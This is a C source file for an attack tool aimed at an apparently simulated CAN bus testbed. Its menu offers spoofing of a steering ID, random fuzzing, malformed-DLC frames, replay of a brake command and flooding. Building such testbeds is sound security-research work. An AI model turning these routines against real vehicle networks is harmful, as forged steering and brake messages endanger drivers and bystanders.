#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include "network.h"
#include "can.h"
#include "config.h"

static void send_frame(int sock, uint32_t id, uint8_t dlc, uint8_t *data)
{
    can_frame_t f = {0};
    f.id  = id;
    f.dlc = dlc;
    memcpy(f.data, data, dlc);
    f.secured = false;
    send(sock, &f, sizeof(f), 0);
}

static void attack_spoof(int sock)
{
    printf("[ATTACK] Spoofing ID 0x120 (steering)\n");
    uint8_t d[1] = { 99 };
    send_frame(sock, 0x120, 1, d);
}

static void attack_fuzz(int sock)
{
    printf("[ATTACK] Fuzzing random IDs\n");
    for (int i = 0; i < 20; i++) {
        uint32_t id = rand() % 0x7FF;
        uint8_t dlc = rand() % 9;
        uint8_t d[8];
        for (int j = 0; j < dlc; j++) d[j] = rand() % 256;
        send_frame(sock, id, dlc, d);
        usleep(50000);
    }
}

static void attack_malformed(int sock)
{
    printf("[ATTACK] Sending malformed DLC frame\n");
    //uint8_t d[1] = { 0xAA };
    uint8_t d[8]={0};
    d[0]=0xAA;
    send_frame(sock, 0x300, 15, d); // DLC > 8
}

static void attack_replay(int sock)
{
    printf("[ATTACK] Replay attack on brake command\n");
    uint8_t d[1] = { 55 };
    for (int i = 0; i < 10; i++) {
        send_frame(sock, 0x300, 1, d);
        usleep(100000);
    }
}

static void attack_flood(int sock)
{
    printf("[ATTACK] Flooding ID 0x302\n");
    uint8_t d[1] = { 0xFF };
    for (int i = 0; i < 200; i++) {
        send_frame(sock, 0x302, 1, d);
    }
}

/*void run_attack_menu(int sock)
{
   while(1){
    int sock = net_connect_to_bus(CAN_IP, CAN_PORT_BUS_SERVER);
    if (sock < 0) {
        printf("[ERROR] Cannot connect to bus\n");
        return 1;
    }

    while (1) {
        printf("\n=== ATTACK MENU ===\n");
        printf("1) Spoofing\n");
        printf("2) Fuzzing\n");
        printf("3) Malformed DLC\n");
        printf("4) Replay\n");
        printf("5) Flooding\n");
        printf("6) Quit\n");
        printf("Select attack: ");

        int choice;
        scanf("%d", &choice);

        switch (choice) {
            case 1: attack_spoof(sock); break;
            case 2: attack_fuzz(sock); break;
            case 3: attack_malformed(sock); break;
            case 4: attack_replay(sock); break;
            case 5: attack_flood(sock); break;
            case 6: close(sock); return 0;
            default: printf("Invalid choice\n");
        }
    }

    return 0;
    }
}*/
void run_attack_menu(int sock)
{
    while (1) {
        printf("\n=== ATTACK MENU ===\n");
        printf("1) Spoofing\n");
        printf("2) Fuzzing\n");
        printf("3) Malformed DLC\n");
        printf("4) Replay\n");
        printf("5) Flooding\n");
        printf("6) Quit\n");
        printf("Select attack: ");

        int choice;
        scanf("%d", &choice);

        switch (choice) {
            case 1: attack_spoof(sock); break;
            case 2: attack_fuzz(sock); break;
            case 3: attack_malformed(sock); break;
            case 4: attack_replay(sock); break;
            case 5: attack_flood(sock); break;
            case 6:
                close(sock);
                return;   // correct exit
            default:
                printf("Invalid choice\n");
        }
    }
}
